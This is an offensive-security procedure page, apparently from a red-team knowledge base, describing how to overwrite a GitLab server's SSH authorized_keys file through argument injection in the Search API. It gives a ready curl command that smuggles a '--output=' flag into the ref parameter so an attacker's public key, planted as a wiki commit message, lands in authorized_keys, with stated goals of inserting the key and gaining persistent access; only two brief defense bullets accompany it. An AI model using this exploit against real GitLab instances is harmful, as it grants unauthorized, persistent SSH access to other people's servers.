---
tags:
  - file-overwrite
  - gitlab
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/git]]'
  - '[[tools/ssh]]'
  - '[[tools/cat]]'
  - '[[tools/GitLab-Wiki]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-gitlab-search-wiki-blobs]]'
  - '[[commands/cat-file-contents]]'
  - '[[commands/ssh-gitlab-access]]'
  - '[[commands/id-user-check]]'
  - '[[commands/cat-authorized-keys]]'
  - '[[commands/curl-gitlab-search-blobs]]'
platforms:
  - Linux
  - GitLab
techniques:
  - '[[Command-Line Interface]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c981df4b-030b-4e8b-8114-a016fb672bda
created_at: '2025-12-11T06:10:29.613Z'
updated_at: '2025-12-11T06:10:29.613Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Overwrite Authorized Keys via API

## Summary

This procedure uses the Search API to overwrite the .ssh/authorized_keys file with an attacker's public key embedded in a commit message.

## Description

By injecting --output=/var/opt/gitlab/.ssh/authorized_keys into the ref parameter, the git log output (including the public key) is written to the authorized_keys file, enabling SSH access.

## Requirements

1. API token
2. Wiki page with public key as commit message
3. Vulnerable GitLab instance

## Defense

Defensive measures and detection strategies:

- Protect sensitive files with permissions
- Log and alert on API parameter anomalies

## Objectives

1. Overwrite authentication file
2. Insert attacker's key
3. Gain persistent access

## Instructions

### Step 1: Prepare Wiki with Key

**Context**: Create wiki page with public key commit.

Use GitLab Wiki to set commit message to public key content.

### Step 2: Inject Flag for Overwrite

**Context**: Target authorized_keys path.

**Command** ([[commands/curl-gitlab-search-wiki-blobs]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

> This overwrites the file with the key.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/curl-gitlab-search-wiki-blobs]]

## Tools Used

- [[tools/curl]]

## Tags

- [[file-overwrite]]
- [[tools/GitLab-Wiki]]
